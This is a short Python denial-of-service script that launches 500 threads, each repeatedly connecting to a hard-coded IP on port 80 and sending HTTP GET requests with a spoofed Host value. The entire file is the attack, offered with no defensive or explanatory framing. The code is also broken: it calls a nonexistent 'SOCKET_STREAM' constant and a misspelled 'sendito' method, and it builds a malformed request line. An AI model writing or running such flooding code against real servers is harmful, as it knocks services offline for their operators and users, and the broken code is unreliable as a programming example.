import threading
import socket

target = '192.168.2.72'
port = 80
fake_ip = '182.21.20.33'

already_connected = 0


def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCKET_STREAM)
        s.connect((target, port))
        s.sendito(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendito(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()

        global already_connected
        already_connected += 1
        if already_connected % 500 == 0:
            print(already_connected)


for i in range(500):
    threat = threading.Thread(target=attack)
    threat.start()
